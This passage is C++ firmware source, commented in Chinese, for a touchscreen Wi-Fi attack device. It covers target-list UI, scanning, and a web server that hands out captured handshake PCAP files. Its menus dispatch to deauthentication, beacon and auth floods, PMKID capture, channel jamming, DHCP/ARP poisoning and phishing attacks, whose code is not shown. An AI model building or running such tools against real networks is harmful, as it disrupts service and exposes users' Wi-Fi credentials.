    g_pendingMenuDraw = true;
    return;
  }
  
  // 再次确认IP
  WiFi.config(IPAddress(192,168,1,1), IPAddress(192,168,1,1),
              IPAddress(192,168,1,1), IPAddress(255,255,255,0));
  
  // 启动Web服务器
  g_webConfigServer.begin();
  g_webConfigRunning = true;
  g_webConfigApUp    = true;
  g_attackRunningType = 14;  // WebConfig
  
  IPAddress apIp = WiFi.localIP();
  Serial.print("[WebConfig] AP已创建 SSID="); Serial.print(WEB_UI_SSID);
  Serial.print(" IP="); Serial.println(apIp);
  
  // 显示启动成功信息并保持界面
  drawWebConfigStatusUI();
  g_screen = SCREEN_WEB_CONFIG;
}

// 后台处理Web配置的HTTP请求（在主循环中调用）
static void webConfigHandleWeb() {
  if (!g_webConfigRunning) return;
  
  WiFiClient client = g_webConfigServer.available();
  if (!client) return;
  
  // 读取HTTP请求
  String line = "", req = "";
  bool reqLineRead = false;
  unsigned long timeout = millis() + 2000;
  
  while (client.connected() && client.available() && millis() < timeout) {
    int c = client.read();
    if (c < 0) { delay(1); continue; }
    if (c == '\n') {
      if (line.length() == 0) break;  // 空行=请求头结束
      if (!reqLineRead) {
        req = line;
        reqLineRead = true;
      }
      line = "";
    } else if (c != '\r') {
      line += (char)c;
    }
    timeout = millis() + 2000;  // 每次收到数据续期
  }
  
  // 跳过剩余头（无用的头数据）
  while (client.available() && millis() < timeout + 1000) {
    if (client.read() < 0) break;
  }
  
  if (req.length() == 0) {
    client.stop();
    return;
  }
  
  Serial.print("[WebConfig] 请求: "); Serial.println(req);
  
  // 路由处理
  if (req.startsWith("GET / ")) {
    // 首页 → 返回web_admin.html
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html; charset=utf-8");
    client.println("Connection: close");
    client.println();
    client.print(WEB_ADMIN_HTML);
  }
  else if (req.startsWith("GET /status")) {
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: application/json");
    client.println("Connection: close");
    client.println();
    client.println("{\"ok\":true}");
  }
  else if (req.startsWith("POST /stop")) {
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: application/json");
    client.println("Connection: close");
    client.println();
    client.println("{\"ok\":true}");
  }
  else if (req.startsWith("GET /handshake/options")) {
    // 返回选项列表（空的占位）
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html; charset=utf-8");
    client.println("Connection: close");
    client.println();
    client.println("<option value=''>Web配置模式下暂不支持</option>");
  }
  else if (req.startsWith("GET /handshake/download") || req.startsWith("GET /download")) {
    // 下载握手包 PCAP 文件
    if (globalPcapData.empty()) {
      client.println("HTTP/1.1 404 Not Found");
      client.println("Content-Type: text/plain");
      client.println("Connection: close");
      client.println();
      client.println("No handshake data");
    } else {
      client.print("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n");
      client.print("Content-Disposition: attachment; filename=\"capture.pcap\"\r\n");
      client.print("Content-Length: " + String(globalPcapData.size()) + "\r\n");
      client.print("Connection: close\r\n\r\n");
      client.write(globalPcapData.data(), globalPcapData.size());
      Serial.println("[WebConfig] PCAP文件已发送 (" + String(globalPcapData.size()) + " bytes)");
      delay(10);
      client.stop();
      return;
    }
  }
  else {
    // 404
    client.println("HTTP/1.1 404 Not Found");
    client.println("Content-Type: text/plain");
    client.println("Connection: close");
    client.println();
    client.println("Not Found");
  }
  
  delay(10);
  client.stop();
}

void showConfirmPopup(int index) {
  if (index < 0 || index >= MENU_COUNT) return;

  // Web配置已运行 → 直接停止（无需弹窗）
  if (index == 14 && g_webConfigRunning) {
    stopWebConfig();
    g_touchValid = false;
    { int16_t dx, dy; unsigned long tm = millis(); while (touch_read(&dx, &dy) && (millis() - tm) < 300) delay(10); }
    return;
  }

  // 需要目标选择的攻击：直接进入WiFi列表选目标（移除弹窗）
  if (index == 5 || index == 8) {
    g_touchValid = false;
    { int16_t dx, dy; unsigned long tm = millis(); while (touch_read(&dx, &dy) && (millis() - tm) < 300) delay(10); }
    // ★ 如果已有选中目标 → 直接执行攻击（跳过WiFi列表）
    if (index != 5 && hasSelectedTargets()) {
      switch (index) {
        case 8: executeAttack(9); return;  // 抓包攻击
      }
    }
    switch (index) {
      case 5: Serial.println("[执行] 钓鱼攻击 → 进入钓鱼子菜单");     phishingSubMenu(); return;
      case 8: Serial.println("[执行] 抓包攻击 → 进入WiFi列表选目标"); gotoWifiListForAttack(9, SCREEN_MAIN, 8); return;
    }
    return;
  }

  Serial.print("请求执行: ");
  Serial.println(menuItems[index]);

  drawPopup(menuItems[index], menuDesc[index]);

  // 计算弹窗动态高度（与drawPopup保持一致：110 + lineCount*18）
  int popupLineCount = 1;
  for (const char* p = menuDesc[index]; p && *p; p++) { if (*p == '\n') popupLineCount++; }
  int popupPh = 110 + popupLineCount * 18;

  // 记录执行前的屏幕状态，用于判断 action 是否切换了屏幕
  ScreenState prevScreen = g_screen;

  // 清除残留触摸状态，防止弹窗被瞬间自动确认（缩短超时，减少等待感）
  g_touchValid = false;
  {
    int16_t dummyX, dummyY; unsigned long tmDrain = millis();
    while (touch_read(&dummyX, &dummyY) && (millis() - tmDrain) < 150) delay(10);
  }

  // 等待用户点击确认或取消
  bool waiting = true;
  while (waiting) {
    int16_t tx, ty;
    if (touch_read(&tx, &ty)) {
      PopupResult r = checkPopupHit(tx, ty, popupPh);
      if (r == POPUP_CONFIRM) {
        // 防连点：清除触摸缓存而非阻塞排空
        g_touchValid = false;
        // 执行功能
        Serial.print(">>> 确认执行: ");
        Serial.println(menuItems[index]);
        switch (index) {
          case 0: Serial.println("[执行] 快速扫描 - 5秒扫描..."); scanNetworks(true, 5000); g_touchValid = false; break;
          case 1: Serial.println("[执行] 深度扫描 - 全信道探测"); homeActionDeepScan(); return;
          case 2: Serial.println("[执行] 选择目标 - WiFi列表..."); g_pendingAttackType = -1; selectedFlags.assign(scan_results.size(), 0); wifiScrollOffset = 0; wifiCursorIndex = -1; g_screen = SCREEN_WIFI_LIST; g_pendingWifiDraw = true; g_touchValid = false; break;
          case 3: Serial.println("[执行] 攻击菜单 - 打开攻击类型选择"); homeActionAttackMenu(); return;
          case 4: Serial.println("[执行] 信道干扰 - CTS阻塞攻击"); if (hasSelectedTargets()) { executeAttack(7); } else { gotoWifiListForAttack(7, SCREEN_MAIN, 4); } return;
          case 6: Serial.println("[执行] 广播黑洞 - DHCP+ARP投毒"); if (hasSelectedTargets()) { executeAttack(8); } else { gotoWifiListForAttack(8, SCREEN_MAIN, 6); } return;
          case 7: Serial.println("[执行] 洪水攻击 - 探测请求泛洪"); attackProbeFlood(); return;
          case 9: Serial.println("[执行] 无线雷达 - 热点可视化"); homeActionRadar(); return;
          case 10: Serial.println("[执行] 帧监视器 - 实时802.11帧分析"); frameMonitor(); return;
          case 11: Serial.println("[执行] 攻击检测 - 环境安全扫描"); attackDetect(); return;
          case 12: Serial.println("[执行] 触摸校准 - 进入校准模式"); homeActionTouchCalibrate(); return;
          case 13: Serial.println("[执行] 系统设置 - 打开设置菜单"); homeActionSettings(); return;
          case 14: Serial.println("[执行] Web配置 - 启动后台管理热点"); startWebConfig(); return;
        }
        waiting = false;
      } else if (r == POPUP_CANCEL) {
        Serial.println(">>> 用户取消操作");
        g_touchValid = false;
        waiting = false;
      }
      // 防连点：触摸仍在时不排空阻塞，由下一帧自然过滤
      // （原300ms阻塞排空已移除，改为 g_touchValid=false 即时响应）
      delay(50);
      continue;
    }
    delay(30);
  }

  // 仅在屏幕未被 action 切换时重绘主菜单
  if (g_screen == SCREEN_MAIN && g_screen == prevScreen) {
    drawMenuUI();
  }
}

// ==================== 绘制功能区域边框（底部按钮栏4分区围绕线）====================
// 4个按钮水平并排于底部：上X=0~59  下X=60~119  确认X=120~179  返回X=180~239
static void drawAreaBorders() {
  int by = BTN_BAR_Y + 2, bh = BTN_BAR_H - 4;
  tft.drawFastVLine(BTN_W,     by, bh, COLOR_AREA_LINE);  // 上 | 下
  tft.drawFastVLine(BTN_W * 2, by, bh, COLOR_AREA_LINE);  // 下 | 确认
  tft.drawFastVLine(BTN_W * 3, by, bh, COLOR_AREA_LINE);  // 确认 | 返回
}

// ==================== 触摸区域判断（匹配240x320竖屏实际按钮布局）====================
// 底部按钮栏：4按钮水平并排 X=0~60~120~180~240, Y=BTN_BAR_Y~320
AreaType checkTouchArea(int16_t tx, int16_t ty) {
  // 底部按钮栏 — X轴4等分 (BTN_W=60)
  if (ty >= BTN_BAR_Y) {
    int btnIdx = tx / BTN_W;
    if      (btnIdx <= 0) return AREA_BTN_UP;    // X:   0 ~  59  上
    else if (btnIdx == 1) return AREA_BTN_DOWN;  // X:  60 ~ 119  下
    else if (btnIdx == 2) return AREA_BTN_OK;    // X: 120 ~ 179  确认
    else                   return AREA_BTN_BACK;  // X: 180 ~ 239  返回
  }
  // 菜单区域（Y=42~285）
  if (ty >= MENU_AREA_Y && ty < BTN_BAR_Y) {
    int idx = (ty - MENU_AREA_Y) / MENU_ITEM_H;
    if (idx >= 0 && idx < MENU_COUNT) return AREA_MENU;
  }
  return AREA_NONE;
}

// ==================== WiFi列表触摸区域判断 ====================
WifiTouchResult checkWifiTouchArea(int16_t tx, int16_t ty) {
  WifiTouchResult r = {WIFI_AREA_NONE, -1};

  // 标题栏 (Y=0~40): 点击切换 全选/取消全选
  if (ty >= 0 && ty < 40) {
    r.area = WIFI_AREA_TITLE;
    return r;
  }

  // 底部按钮栏 Row1 (Y=229~271): 刷新
  if (ty >= WIFI_BTN_ROW1_Y && ty < WIFI_BTN_ROW1_Y + WIFI_BTN_ROW1_H) {
    r.area = WIFI_AREA_BTN_REFRESH;
    return r;
  }

  // 底部按钮栏 Row2 (Y=276~315): 上 | 下 | 确认 | 返回
  if (ty >= WIFI_BTN_ROW2_Y && ty < WIFI_BTN_ROW2_Y + WIFI_BTN_ROW2_H) {
    if      (tx < BTN_W)       r.area = WIFI_AREA_BTN_UP;       // X:   0~ 59
    else if (tx < BTN_W * 2)   r.area = WIFI_AREA_BTN_DOWN;     // X:  60~119
    else if (tx < BTN_W * 3)   r.area = WIFI_AREA_BTN_OK;       // X: 120~179
    else                        r.area = WIFI_AREA_BTN_BACK;     // X: 180~239
    return r;
  }

  // 列表区域 (44-224)
  if (ty >= WIFI_LIST_Y && ty < WIFI_LIST_BOTTOM) {
    int idx = (ty - WIFI_LIST_Y) / WIFI_LIST_ITEM_H + wifiScrollOffset;
    if (idx >= 0 && (size_t)idx < scan_results.size()) {
      r.area = WIFI_AREA_ITEM;
      r.itemIndex = idx;
    }
  }

  return r;
}

// ==================== WiFi列表屏幕交互处理 ====================
void handleWifiListTouch(WifiTouchResult r) {
  // ═══ 入口统一同步：任何代码路径都可能只改了 scan_results 而忘记同步 selectedFlags ═══
  // 深层扫描/攻击检测/雷达刷新/逐信道扫描等都会 clear+扫描 scan_results 但不一定调 assign
  // 不同步则 selectedFlags[x] 越界 → 内存破坏 → 立即崩溃
  if (selectedFlags.size() != scan_results.size()) {
    selectedFlags.assign(scan_results.size(), 0);
  }

  switch (r.area) {
    case WIFI_AREA_TITLE: {
      // 点击标题栏：智能切换 全选/取消全选
      int selCount = 0;
      for (size_t i = 0; i < selectedFlags.size(); i++)
        if (selectedFlags[i]) selCount++;
      bool selectAll = (selCount == 0);  // 无选中 → 全选；否则 → 取消全选
      for (size_t i = 0; i < selectedFlags.size(); i++)
        selectedFlags[i] = selectAll ? 1 : 0;
      Serial.println(selectAll ? "[WiFi列表] 标题栏点击 → 全选" : "[WiFi列表] 标题栏点击 → 取消全选");
      redrawWifiTitle();      // 标题栏计数变化
      redrawWifiScroll();     // 所有可见项勾选框状态翻转（不清屏，不碰按钮栏）
      break;
    }

    case WIFI_AREA_BTN_UP: {
      if (scan_results.empty()) break;
      int oldOffset = wifiScrollOffset;
      int oldIdx    = wifiCursorIndex;
      if (wifiCursorIndex < 0) {
        wifiCursorIndex = 0;  // 从无光标 → 选中第一项
      } else if (wifiCursorIndex > 0) {
        wifiCursorIndex--;    // 向上移动
      }
      // 光标超出可视区则滚动
      if (wifiCursorIndex < wifiScrollOffset)
        wifiScrollOffset = wifiCursorIndex;
      // 滚动偏移变化 → 仅刷新列表项+滚动条（不碰标题栏、不清屏）；否则仅刷新2项
      if (wifiScrollOffset != oldOffset) {
        redrawWifiScroll();
      } else {
        if (oldIdx >= 0)           redrawWifiItemByIndex(oldIdx);
        if (wifiCursorIndex >= 0)  redrawWifiItemByIndex(wifiCursorIndex);
      }
      break;
    }

    case WIFI_AREA_BTN_DOWN: {
      if (scan_results.empty()) break;
      int oldOffset = wifiScrollOffset;
      int oldIdx    = wifiCursorIndex;
      int maxIdx = (int)scan_results.size() - 1;
      if (wifiCursorIndex < 0) {
        wifiCursorIndex = 0;  // 从无光标 → 选中第一项
      } else if (wifiCursorIndex < maxIdx) {
        wifiCursorIndex++;    // 向下移动
      }
      // 光标超出可视区则滚动
      if (wifiCursorIndex >= wifiScrollOffset + WIFI_LIST_VISIBLE)
        wifiScrollOffset = wifiCursorIndex - WIFI_LIST_VISIBLE + 1;
      // 滚动偏移变化 → 仅刷新列表项+滚动条（不碰标题栏、不清屏）；否则仅刷新2项
      if (wifiScrollOffset != oldOffset) {
        redrawWifiScroll();
      } else {
        if (oldIdx >= 0)           redrawWifiItemByIndex(oldIdx);
        if (wifiCursorIndex >= 0)  redrawWifiItemByIndex(wifiCursorIndex);
      }
      break;
    }

    case WIFI_AREA_BTN_REFRESH:
      // 重新扫描 → 仅刷新标题+列表+滚动条, 不重绘按钮栏, 避免全屏闪烁
      Serial.println("[WiFi列表] 刷新扫描...");
      g_touchValid = false;          // 清除触摸去抖，防止长按误弹二次扫描
      scanNetworks(false, 5000);     // 后台扫描不绘图，5s 超时收集足够 AP
      wifiScrollOffset = 0;
      wifiCursorIndex = -1;
      redrawWifiListContent();       // 局部刷新：标题+列表+滚动条（不碰按钮栏）
      break;

    case WIFI_AREA_ITEM: {
      int idx = r.itemIndex;
      if (idx < 0 || (size_t)idx >= scan_results.size()) break;
      // 入口守卫已同步 selectedFlags.size() == scan_results.size()
      // 此处不再需要单独防御

      // 触摸 = 立即切换勾选（不再需要先双击聚焦）
      selectedFlags[idx] = !selectedFlags[idx];
      Serial.print("[WiFi列表] 切换 ");
      Serial.print(scan_results[idx].ssid);
      Serial.print(" -> ");
      Serial.println(selectedFlags[idx] ? "选中" : "取消");

      // 同时移动光标（如与旧位置不同则刷新旧项）
      int oldIdx = wifiCursorIndex;
      wifiCursorIndex = idx;
      if (oldIdx >= 0 && oldIdx != idx) redrawWifiItemByIndex(oldIdx);
      redrawWifiTitle();
      redrawWifiItemByIndex(idx);
      break;
    }

    case WIFI_AREA_BTN_OK: {
      // 如果有待执行的攻击 → 直接执行
      if (g_pendingAttackType >= 0) {
        int atk = g_pendingAttackType;
        g_pendingAttackType = -1;  // 先清除，防止攻击内部回调时重复执行
        g_touchValid = false;
        Serial.print("[WiFi列表] 执行待定攻击 type=");
        Serial.println(atk);
        switch (atk) {
          case 0:  attackDeauth();       break;
          case 1:  attackBeacon();       break;
          case 2:  attackBeaconDeauth(); break;
          case 3:  attackPMKID();        break;
          case 4:  attackAuthFlood();    break;
          case 5:  attackCSA();          break;
          case 6:  attackBcastDeauth();  break;
          case 7:  attackChannelJam();   break;
          case 8:  attackBlackhole();    break;
          case 9:  captureHandshake();   break;
          case 10: phishingAttackWifi(); break;
        }
        break;
      }

      // 打印选中的AP列表
      int count = 0;
      Serial.println("=== 已选择目标 ===");
      for (size_t i = 0; i < scan_results.size(); i++) {
        if (selectedFlags[i]) {
          Serial.print("  [");
          Serial.print(++count);
          Serial.print("] ");
          Serial.print(scan_results[i].ssid);
          Serial.print("  BSSID:");
          Serial.print(scan_results[i].bssid_str);
          Serial.print("  CH:");
          Serial.print(scan_results[i].channel);
          Serial.print("  RSSI:");
          Serial.print(scan_results[i].rssi);
          Serial.println("dBm");
        }
      }
      if (count == 0) Serial.println("  (无)");
      Serial.println("===================");

      // 返回主菜单
      g_touchValid = false;
      g_screen = SCREEN_MAIN;
      drawMenuUI();
      break;
    }

    case WIFI_AREA_BTN_BACK:
      // 清除待执行攻击，返回来源屏幕
      g_pendingAttackType = -1;
      g_touchValid = false;
      if (g_wifiReturnScreen == SCREEN_ATTACK_MENU) {
        Serial.println("[WiFi列表] 返回攻击菜单");
        g_screen = SCREEN_ATTACK_MENU;
        g_attackMenuIdx = g_wifiReturnMenuIdx;
        g_pendingAttackMenuDraw = true;  // 延迟绘制，避免 SPI 重入崩溃
      } else {
        Serial.println("[WiFi列表] 返回主菜单");
        g_screen = SCREEN_MAIN;
        drawMenuUI();
      }
      break;

    default:
      break;
  }
}

// ==================== WiFi 列表屏幕绘制 ====================
// RSSI → 信号强度颜色
uint16_t rssiColor(short rssi) {
  if (rssi >= -50) return COLOR_SIGNAL_GOOD;
  if (rssi >= -70) return COLOR_SIGNAL_OK;
  return COLOR_SIGNAL_WEAK;
}

// security_type → 颜色
uint16_t securityColor(int type) {
  switch (type) {
    case 0:  return COLOR_SEC_OPEN;   // OPEN
    case 1:  return COLOR_SEC_WEP;    // WEP
    case 2:  return COLOR_SEC_WPA;    // WPA PSK
    case 3:  return COLOR_SEC_WPA2;   // WPA2 PSK
    case 4:  return COLOR_SEC_WPA;    // WPA ENTERPRISE
    case 5:  return COLOR_SEC_WPA2;   // WPA2 ENTERPRISE
    case 6:  return COLOR_SEC_WPA3;   // WPA3 SAE
    case 7:  return COLOR_SEC_WPA3;   // WPA2/3 MIXED
    case 8:  return COLOR_SEC_WPA3;   // OWE
    default: return COLOR_CHK_OFF;
  }
}

const char* securityName(int type) {
  switch (type) {
    case 0: return "O";   // OPEN
    case 1: return "W";   // WEP
    case 2: return "P";   // WPA
    case 3: return "2";   // WPA2
    case 4: return "E";   // WPA-E
    case 5: return "E2";  // WPA2-E
    case 6: return "3";   // WPA3 SAE
    case 7: return "23";  // WPA2/3 MIXED
    case 8: return "O+";  // OWE
    default: return "?";
  }
}

// 列表单项绘制 (x=4, y, w=232, h=WIFI_LIST_ITEM_H)
void drawWifiItem(int index, int y, bool isSelected, bool isCursor) {
  int h = WIFI_LIST_ITEM_H - 1;

  // 背景
  if (isCursor) {
    tft.fillRoundRect(2, y, SCREEN_WIDTH - 4, h, 3, COLOR_MENU_SEL);
  } else {
    tft.fillRect(2, y, SCREEN_WIDTH - 4, h, (index & 1) ? COLOR_ITEM_BG : COLOR_BG);
  }

  if (index < 0 || (size_t)index >= scan_results.size()) return;
  const WiFiScanResult& ap = scan_results[index];

  uint16_t textBg = isCursor ? COLOR_MENU_SEL : ((index & 1) ? COLOR_ITEM_BG : COLOR_BG);

  // 勾选方框
  int chkX = 6, chkY = y + 7, chkS = 16;
  if (isSelected) {
    tft.fillRoundRect(chkX, chkY, chkS, chkS, 3, COLOR_CHK_ON);
    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
    u8g2_for_adafruit_gfx.setForegroundColor(COLOR_WHITE);
    u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_CHK_ON);
    int tw = u8g2_for_adafruit_gfx.getUTF8Width("✓");
    u8g2_for_adafruit_gfx.setCursor(chkX + (chkS - tw) / 2, chkY + 13);
    u8g2_for_adafruit_gfx.print("✓");
  } else {
    tft.drawRoundRect(chkX, chkY, chkS, chkS, 3, COLOR_CHK_OFF);
  }

  int textX = chkX + chkS + 8;       // 30
  int rightX = 180;                  // 右侧信息起始列

  // ===== 第1行: SSID (左) + CH 信道 / 加密类型 (右) =====
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setBackgroundColor(textBg);

  String ssid = ap.ssid_display;
  if (ssid.length() == 0) ssid = (ap.ssid.length() == 0) ? "<隐藏>" : ap.ssid;
  u8g2_for_adafruit_gfx.setForegroundColor(isCursor ? COLOR_WHITE : COLOR_MENU_TEXT);
  u8g2_for_adafruit_gfx.setCursor(textX, y + 11);
  u8g2_for_adafruit_gfx.print(ssid);

  String chInfo = "CH" + String(ap.channel);
  const char* secName = securityName(ap.security_type);
  u8g2_for_adafruit_gfx.setForegroundColor(isCursor ? COLOR_WHITE : COLOR_MENU_TEXT);
  u8g2_for_adafruit_gfx.setCursor(rightX, y + 11);
  u8g2_for_adafruit_gfx.print(chInfo);

  u8g2_for_adafruit_gfx.setForegroundColor(isCursor ? COLOR_WHITE : securityColor(ap.security_type));
  u8g2_for_adafruit_gfx.setCursor(rightX + u8g2_for_adafruit_gfx.getUTF8Width(chInfo.c_str()) + 4, y + 11);
  u8g2_for_adafruit_gfx.print(secName);

  // ===== 第2行: BSSID/MAC (左) + 信号条 + RSSI (右) =====
  // BSSID — 隐藏热点（SSID为空）的MAC使用主文字色，其余用次级色区分
  bool isHidden = (ap.ssid.length() == 0);
  uint16_t bssidColor;
  if (isCursor)       bssidColor = COLOR_WHITE;
  else if (isHidden)  bssidColor = COLOR_MENU_TEXT;
  else                bssidColor = 0x632C;  // 次级灰/蓝灰

  u8g2_for_adafruit_gfx.setForegroundColor(bssidColor);
  u8g2_for_adafruit_gfx.setCursor(textX, y + 23);
  u8g2_for_adafruit_gfx.print(ap.bssid_str);

  // 信号条
  int sigBars = 0;
  uint16_t sigColor = COLOR_SIGNAL_WEAK;
  if (ap.rssi >= -50)      { sigBars = 4; sigColor = COLOR_SIGNAL_GOOD; }
  else if (ap.rssi >= -60) { sigBars = 3; sigColor = COLOR_SIGNAL_GOOD; }
  else if (ap.rssi >= -70) { sigBars = 2; sigColor = COLOR_SIGNAL_OK;   }
  else if (ap.rssi >= -80) { sigBars = 1; sigColor = COLOR_SIGNAL_WEAK; }

  int barBaseY = y + 23;
  int barX     = rightX;
  uint16_t barCol = isCursor ? COLOR_WHITE : sigColor;

  for (int b = 0; b < 4; b++) {
    int barH = 4 + b * 4;
    int bx   = barX + b * 5;
    int by   = barBaseY - barH + 1;
    if (b < sigBars) {
      tft.fillRect(bx, by, 4, barH, barCol);
    } else {
      tft.drawRect(bx, by, 4, barH, isCursor ? 0x7BEF : 0x4A69);
    }
  }

  // RSSI 数值
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(isCursor ? COLOR_WHITE : sigColor);
  u8g2_for_adafruit_gfx.setBackgroundColor(textBg);
  u8g2_for_adafruit_gfx.setCursor(rightX + 22, y + 23);
  u8g2_for_adafruit_gfx.print(ap.rssi);
}

// 仅刷新标题栏（选中计数变化时调用，极快）
void redrawWifiTitle() {
  tft.fillRect(0, 0, SCREEN_WIDTH, 40, COLOR_TITLE_BG);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  u8g2_for_adafruit_gfx.setForegroundColor(COLOR_TITLE_TEXT);
  u8g2_for_adafruit_gfx.setBackgroundColor(COLOR_TITLE_BG);

  char titleBuf[32];
  int total = (int)scan_results.size();
  int selCount = 0;
  for (size_t i = 0; i < selectedFlags.size(); i++)
    if (selectedFlags[i]) selCount++;
  snprintf(titleBuf, sizeof(titleBuf), "WiFi列表 (%d/%d)", selCount, total);
  int tw = u8g2_for_adafruit_gfx.getUTF8Width(titleBuf);
  u8g2_for_adafruit_gfx.setCursor((SCREEN_WIDTH - tw) / 2, 28);
  u8g2_for_adafruit_gfx.print(titleBuf);
}

// 仅刷新单个列表项（切换选中/光标移动时调用，O(1)项）
void redrawWifiItemByIndex(int idx) {
  if (idx < wifiScrollOffset || idx >= wifiScrollOffset + WIFI_LIST_VISIBLE) return;
  if (idx < 0 || (size_t)idx >= scan_results.size()) return;
  int visIdx = idx - wifiScrollOffset;
  int yy = WIFI_LIST_Y + visIdx * WIFI_LIST_ITEM_H;
  bool sel = (size_t)idx < selectedFlags.size() ? selectedFlags[idx] : false;
  drawWifiItem(idx, yy, sel, (idx == wifiCursorIndex));
}

// 局部刷新：仅重绘标题+列表区+滚动条（不碰按钮栏，消除闪烁）
void redrawWifiListContent() {
  redrawWifiTitle();

  // 列表区顶部分隔线
  tft.drawLine(0, 41, SCREEN_WIDTH, 41, 0x18E7);

  // 擦除旧列表区
  tft.fillRect(0, WIFI_LIST_Y, SCREEN_WIDTH, WIFI_LIST_BOTTOM - WIFI_LIST_Y, COLOR_BG);

  // 列表项
  int itemsTotal = (int)scan_results.size();
  int visible = (itemsTotal < WIFI_LIST_VISIBLE) ? itemsTotal : WIFI_LIST_VISIBLE;
  for (int i = 0; i < visible; i++) {
    int idx = wifiScrollOffset + i;
    int yy = WIFI_LIST_Y + i * WIFI_LIST_ITEM_H;
    bool sel = (idx >= 0 && (size_t)idx < selectedFlags.size()) ? selectedFlags[idx] : false;
    drawWifiItem(idx, yy, sel, (idx == wifiCursorIndex));
  }

  // 列表区底部分隔线
  tft.drawLine(0, WIFI_LIST_BOTTOM, SCREEN_WIDTH, WIFI_LIST_BOTTOM, 0x18E7);

  // 滚动条
  if (itemsTotal > WIFI_LIST_VISIBLE) {
    int trackH = WIFI_LIST_VISIBLE * WIFI_LIST_ITEM_H;
    int thumbH = trackH * WIFI_LIST_VISIBLE / itemsTotal;
    if (thumbH < 10) thumbH = 10;
    int thumbY = WIFI_LIST_Y + (trackH - thumbH) * wifiScrollOffset / (itemsTotal - WIFI_LIST_VISIBLE);
    tft.fillRect(237, WIFI_LIST_Y, 3, trackH, COLOR_BG);
    tft.drawRect(237, WIFI_LIST_Y, 3, trackH, 0x18E7);
    tft.fillRect(237, thumbY, 3, thumbH, COLOR_MENU_TEXT);
  }
}

// 上下翻页滚动刷新：仅重绘列表区+滚动条，不碰标题栏（标题未变），不做fillRect清屏
// 每个drawWifiItem自带背景填充，无需先清屏再画
void redrawWifiScroll() {
  // 列表区顶部分隔线
  tft.drawLine(0, 41, SCREEN_WIDTH, 41, 0x18E7);

  // 重绘全部可见项
  int itemsTotal = (int)scan_results.size();
  int visible = (itemsTotal < WIFI_LIST_VISIBLE) ? itemsTotal : WIFI_LIST_VISIBLE;
  for (int i = 0; i < visible; i++) {
    int idx = wifiScrollOffset + i;
    int yy = WIFI_LIST_Y + i * WIFI_LIST_ITEM_H;
    bool sel = (idx >= 0 && (size_t)idx < selectedFlags.size()) ? selectedFlags[idx] : false;
    drawWifiItem(idx, yy, sel, (idx == wifiCursorIndex));
  }

  // 列表区底部分隔线
  tft.drawLine(0, WIFI_LIST_BOTTOM, SCREEN_WIDTH, WIFI_LIST_BOTTOM, 0x18E7);

  // 滚动条
  if (itemsTotal > WIFI_LIST_VISIBLE) {
    int trackH = WIFI_LIST_VISIBLE * WIFI_LIST_ITEM_H;
    int thumbH = trackH * WIFI_LIST_VISIBLE / itemsTotal;
    if (thumbH < 10) thumbH = 10;
    int thumbY = WIFI_LIST_Y + (trackH - thumbH) * wifiScrollOffset / (itemsTotal - WIFI_LIST_VISIBLE);
    tft.fillRect(237, WIFI_LIST_Y, 3, trackH, COLOR_BG);
    tft.drawRect(237, WIFI_LIST_Y, 3, trackH, 0x18E7);
    tft.fillRect(237, thumbY, 3, thumbH, COLOR_MENU_TEXT);
  }
}

// 绘制整个WiFi列表屏幕（仅首次进入时调用）
void drawWiFiListScreen() {
  tft.fillScreen(COLOR_BG);

  // 标题+列表+滚动条
  redrawWifiListContent();

  // ===== 底部按钮栏 =====
  tft.fillRect(0, WIFI_BTN_BAR_Y, SCREEN_WIDTH, WIFI_BTN_BAR_H, COLOR_BG);

  // 刷新按钮 (居中)
  drawButton((SCREEN_WIDTH / 2) - 30, WIFI_BTN_ROW1_Y, 60, WIFI_BTN_ROW1_H, COLOR_BTN_OK, "刷新", COLOR_WHITE);

  // Row 2: 上 | 下 | 确认 | 返回
  drawButton(0,       WIFI_BTN_ROW2_Y, BTN_W, WIFI_BTN_ROW2_H, COLOR_BTN_UP,      "上",   COLOR_WHITE);
  drawButton(BTN_W,   WIFI_BTN_ROW2_Y, BTN_W, WIFI_BTN_ROW2_H, COLOR_BTN_DOWN,    "下",   COLOR_WHITE);
  drawButton(BTN_W*2, WIFI_BTN_ROW2_Y, BTN_W, WIFI_BTN_ROW2_H, COLOR_CONFIRM_BG,  "确认", COLOR_WHITE);
  drawButton(BTN_W*3, WIFI_BTN_ROW2_Y, BTN_W, WIFI_BTN_ROW2_H, COLOR_BTN_BACK,    "返回", COLOR_WHITE);
}
// ==================== WiFi 扫描 ====================
// 扫描结果回调（由 wifi_scan_networks 调用）
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;  // 确保字符串终止
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    result.security_type = record->security;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  } else {
    g_scanDone = true;  // 扫描完成
  }
  return RTW_SUCCESS;
}

// 预截断所有SSID到显示宽度（扫描完成后调用一次，避免每次绘制都逐字计算）
static void preTruncateSSIDs() {
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
  const int maxW = 125;
  for (auto& ap : scan_results) {
    String s = ap.ssid;
    if (s.length() == 0) { ap.ssid_display = "<隐藏>"; continue; }
    // 二分查找截断点 (O(log n) vs 原逐字删除 O(n))
    int lo = 0, hi = s.length();
    while (lo < hi) {
      int mid = (lo + hi + 1) / 2;
      String sub = s.substring(0, mid);
